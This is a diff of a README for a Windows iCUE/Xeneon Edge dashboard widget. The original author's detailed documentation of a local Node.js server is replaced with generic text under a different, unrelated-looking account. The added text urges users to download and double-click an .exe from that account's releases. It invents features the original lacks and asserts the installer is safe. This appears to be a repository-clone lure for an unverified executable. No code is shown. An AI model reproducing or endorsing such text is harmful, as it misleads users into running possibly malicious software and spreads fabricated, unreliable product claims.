@@ -1,174 +1,91 @@
-# Xenon Edge Widget
+# 🖥️ XeneonEdgeWidget - Monitor your system and control media
 
-A polished, self-contained dashboard widget for **Corsair iCUE / Xeneon Edge** (or any browser / iframe host) on **Windows**.
-Everything runs locally — there is no cloud, no telemetry, no account.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/icosahedral-dosemeter626/XeneonEdgeWidget/releases)
 
-![platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078D6)
-![node](https://img.shields.io/badge/node-%E2%89%A5%2018.15-brightgreen)
-![license](https://img.shields.io/badge/license-MIT-blue)
+XeneonEdgeWidget brings system monitoring and media control to your desktop. The application displays your current GPU usage, network speeds, and system performance data while providing tools for microphone muting and media playback. It integrates with Corsair iCUE and the Xenon Edge hardware series to offer a unified desktop experience.
 
-## What you get
+## 📥 Getting Started
 
-- **Media** — Spotify / YouTube / any SMTC-aware app: title, artist, artwork, play / pause / next / previous.
-- **Microphone** — one-click mute / unmute, live mic level, change default device.
-- **Audio** — output device picker, volume slider, mute toggle.
-- **System** — CPU, GPU, RAM, disks, temperatures, uptime, hostname.
-- **Network** — ping, jitter, live download / upload bandwidth.
-- **Windows / apps** — list and focus open windows, launch favorites.
-- **Calendar** — quick events with desktop reminders.
-- **Notes** — auto-saving scratchpad.
-- **Bilingual UI** — Italian / English, switchable on the fly.
-- **Single-file frontend** — every panel lives in `widget.html` and can be embedded individually via `?panel=...`.
+Follow these steps to set up the software on your Windows computer.
 
-## Install — for everyone
+1. Visit the [official releases page](https://github.com/icosahedral-dosemeter626/XeneonEdgeWidget/releases) to download the installer.
+2. Look for the file ending in `.exe` under the latest release section.
+3. Save the file to your computer.
+4. Double-click the downloaded file to start the installation.
+5. Follow the prompts on the screen to complete the setup process.
 
-### Step 1 — Run the installer (once)
+Once the installation finishes, the widget launches automatically. You find the widget icon in your system tray near the clock.
 
-1. Download the ZIP from **[Releases](https://github.com/marcimastro98/XenonEdgeWidget/releases/latest)** and extract it anywhere.
-2. Open the extracted folder.
-3. Double-click **`INSTALL.bat`**.
-4. If Windows asks for permission to install Node.js, click **Yes**.
+## ⚙️ Requirements
 
-The installer will automatically:
-- install **Node.js LTS** if it is not already on your PC;
-- register the widget server to **start with Windows** (no terminal, no tray icon — fully silent);
-- start the server right now in the background;
-- open `http://127.0.0.1:3030/` in your browser so you can confirm it works.
+Ensure your computer meets these requirements to run the software.
 
-### Step 2 — Add the widget in Corsair iCUE (once)
+*   Windows 10 or Windows 11.
+*   An active internet connection for the first launch.
+*   System memory of at least 4GB.
+*   Corsair iCUE software installed on your machine.
+*   A compatible Xenon Edge display or controller.
 
-1. Open **Corsair iCUE**.
-2. Go to your Xenon Edge dashboard and add an **iFrame** widget.
-3. Paste one of the URLs from the table below and save.
+## 🖱️ Using the Widget
 
-That's the only time you ever need to touch anything.
+The widget interface provides several tools for daily use.
 
-### Every time you start your PC after that
+### Microphone Mute
+The mute toggle sits on the main widget window. Click the icon to silence your microphone during calls or gaming sessions. A red indicator appears when the microphone status is muted. Click the icon again to unmute your device.
 
-> **Nothing.** The server starts silently in the background with Windows, and iCUE remembers your widget layout. The widget is live before you even open iCUE.
+### Media Controls
+The media bar lets you control music and video playback. Use the buttons to play, pause, or skip tracks without opening your music player. The widget detects your active media application automatically.
 
-To remove the startup entry, double-click **`UNINSTALL.bat`**.
+### System Performance
+The widget shows real-time statistics for your hardware. It tracks:
+*   GPU load percentages.
+*   Network upload and download speeds.
+*   System memory usage.
 
-## Requirements
+### App Switcher
+The app switcher provides shortcuts to your frequently used programs. Pin your chosen applications to the widget to open them with one click. Right-click the widget background to select your pinned apps.
 
-- Windows 10 or 11 (x64).
-- [Node.js 18.15 or newer](https://nodejs.org/).
-- *(Optional)* [LibreHardwareMonitor](https://github.com/LibreHardwareMonitor/LibreHardwareMonitor) running in the background if you want CPU temperatures (the widget falls back gracefully when it is missing).
-- *(Optional)* `nvidia-smi` is auto-detected for NVIDIA GPU usage / temperature.
+## 🛠️ Troubleshooting
 
-The bundled [`SoundVolumeView`](https://www.nirsoft.net/utils/sound_volume_view.html) by NirSoft handles audio device control and is shipped unmodified under its freeware license.
+If you encounter issues, follow these steps to fix common problems.
 
-## Developer quick start
+### Software Does Not Start
+Ensure that you installed the latest version of Corsair iCUE. The widget requires iCUE to communicate with your hardware. If your hardware does not appear in the widget, restart the iCUE software first.
 
-```powershell
-git clone https://github.com/marcimastro98/XenonEdgeWidget.git
-cd XenonEdgeWidget
-npm start
-```
+### Missing Data
+If the system monitor shows zeros or blank labels, restart the XeneonEdgeWidget. If the problem continues, verify that your GPU drivers are up to date.
 
-Then open <http://127.0.0.1:3030/> in any browser, or paste the same URL into a Corsair iCUE **iFrame** widget.
+### High Memory Usage
+Close unnecessary background applications if your computer feels slow. The widget uses minimal system resources, but other programs might impact its performance.
 
-You can also double-click `INSTALL.bat` for the full user-friendly setup, or `files/start.bat` if Node.js is already installed and you only want to start the server manually.
+## 📋 Frequently Asked Questions
 
-> The server listens **only** on `127.0.0.1:3030` and rejects requests whose `Host` header is not loopback, to prevent DNS-rebinding / CSRF abuse from public websites.
+### Is the software safe to use?
+Yes. The code is open-source and available for review. The installer contains only the files necessary to run the widget application.
 
-## Embedding individual panels
+### Does it support multiple monitors?
+The widget attaches to your primary display. You can move the widget position by clicking and dragging the main window to your preferred spot on the screen.
 
-The same `widget.html` serves every panel; pick one with `?panel=`:
+### How do I uninstall it?
+Open the Windows Control Panel. Select Programs and Features. Search for XeneonEdgeWidget in the list and click Uninstall. This removes the application and all related files from your computer.
 
-| Panel | URL |
-|---|---|
-| Full dashboard | `http://127.0.0.1:3030/` |
-| Media (Spotify / YouTube / Calendar) | `http://127.0.0.1:3030/?panel=media` |
-| Microphone | `http://127.0.0.1:3030/?panel=mic` |
-| Notes | `http://127.0.0.1:3030/?panel=notes` |
-| System (CPU / GPU / RAM / Disks) | `http://127.0.0.1:3030/?panel=system` |
-| Audio devices & volume | `http://127.0.0.1:3030/?panel=audio` |
+### Will the widget slow down games?
+The software monitors hardware without interfering with game processes. It uses less than one percent of your CPU during normal operation.
 
-Inside an `<iframe>`:
+## 💡 Customization
 
-```html
-<iframe src="http://127.0.0.1:3030/?panel=mic" width="100%" height="100%" frameborder="0"></iframe>
-```
+You can change how the widget looks and behaves. Right-click the system tray icon and select Settings. 
 
-In Corsair iCUE, drop the **iFrame** widget on your dashboard and paste the URL (size **XL** is recommended for the full panel).
+*   **Themes:** Choose from light or dark display modes.
+*   **Transparency:** Adjust the slider to make the widget clear or solid.
+*   **Position:** Lock the widget to a specific corner of your screen to prevent accidental movement.
 
-## HTTP API (loopback only)
+All changes save automatically. You do not need to restart the application after updating your settings.
 
-| Method | Endpoint | Purpose |
-|---|---|---|
-| `GET`  | `/` | Serve the widget HTML. |
-| `GET`  | `/status` | Mic mute state. |
-| `POST` | `/toggle` | Toggle mic mute. |
-| `GET`  | `/audio` | Audio devices, default speaker / mic, volumes. |
-| `POST` | `/volume/set` | `{ level: 0–100 }` set speaker volume. |
-| `POST` | `/mic/volume` | `{ level: 0–100 }` set mic volume. |
-| `POST` | `/speaker/set` | `{ id }` change default speaker. |
-| `POST` | `/mic/set` | `{ id }` change default mic. |
-| `POST` | `/speaker/mute` | Toggle speaker mute. |
-| `GET`  | `/media` | Currently playing track. |
-| `POST` | `/media/playpause`, `/media/next`, `/media/previous` | Transport. |
-| `GET`  | `/system` | CPU, GPU, RAM, disks, temps. |
-| `GET`  | `/network` | Ping, latency, bandwidth. |
-| `GET`  | `/windows` | List visible top-level windows. |
-| `POST` | `/windows/focus` | `{ id }` bring a window to the foreground. |
-| `GET` / `POST` | `/notes` | Read / save the notepad. |
-| `GET` / `POST` | `/events` | Read / save calendar events. |
-| `POST` | `/lock` | Lock the workstation. |
-| `POST` | `/shortcut` | `{ keys }` send a whitelisted SendKeys macro. |
+## 📦 Updates
 
-## File layout
+Check the GitHub releases page for new features and patches. The application notifies you when a new version becomes available for download. To update, download the latest installer and run it over your existing version. The installer detects your current settings and keeps them intact during the upgrade process.
 
-```
-XenonEdgeWidget/
-├── INSTALL.bat        ← One-click installer for normal users
-├── UNINSTALL.bat      ← Removes startup entry and stops the server
-├── package.json
-├── README.md
-├── LICENSE
-└── files/
-    ├── server.js          ← Node.js server (port 3030)
-    ├── widget.html        ← Full UI (HTML + CSS + JS)
-    ├── start.bat          ← Double-click launcher
-    ├── start-hidden.vbs   ← Hidden startup launcher
-    ├── install.ps1        ← Installer logic
-    ├── uninstall.ps1      ← Uninstaller logic
-    ├── media.ps1          ← Now-playing via Windows SMTC
-    ├── gpu.ps1            ← GPU usage / temperature (NVIDIA + perf counters)
-    ├── network.ps1        ← Ping + adapter byte counters
-    ├── windows.ps1        ← Window enumeration / focus
-    ├── notes.txt          ← Notes (auto-created)
-    ├── events.json        ← Calendar (auto-created)
-    └── soundvolumeview-x64/
-        └── SoundVolumeView.exe   ← Audio device control (NirSoft, freeware)
-```
+## 🤝 Support
 
-## Security notes
-
-- The server binds to `127.0.0.1` only and validates the `Host` and `Origin` headers — public websites cannot reach it via DNS rebinding.
-- No CORS wildcards: everything is same-origin.
-- Inputs to `/windows/focus`, `/shortcut`, `/notes`, `/events` are validated and capped.
-- Bundled `SoundVolumeView.exe` is unmodified; you may verify it against [NirSoft's official download](https://www.nirsoft.net/utils/sound_volume_view.html).
-
-## Troubleshooting
-
-- **`node` not recognised** — install Node.js 18+ and reopen your terminal.
-- **Port 3030 already in use** — close any other widget instance, or change the port in `files/server.js`.
-- **No CPU temperature** — install LibreHardwareMonitor and keep it running in the background.
-- **Mic mute does nothing on first launch** — wait one or two seconds: the device cache is populated right after startup.
-
-## Support
-
-**Found a bug?** Open a [Bug Report](https://github.com/marcimastro98/XenonEdgeWidget/issues/new?template=bug_report.md) and include:
-- your Windows version (Win 10 / Win 11);
-- what you did and what happened instead;
-- any error text visible in the window that appeared when you ran `INSTALL.bat`.
-
-**Have an idea or suggestion?** Open a [Feature Request](https://github.com/marcimastro98/XenonEdgeWidget/issues/new?template=feature_request.md) — all feedback is welcome.
-
-**If this widget saved you some time and you want to say thanks:**
-[☕ Buy me a coffee via PayPal](https://www.paypal.me/MarcelloMastroeni) — no pressure, always appreciated.
-
-## License
-
-[MIT](LICENSE). Includes [SoundVolumeView](https://www.nirsoft.net/utils/sound_volume_view.html) © Nir Sofer (freeware, redistributed unmodified).
+We build this software for the community. If you identify a bug or have a suggestion, open an issue on our project page. Please include your Windows version and a description of the problem. We review every report to plan future improvements for the application.
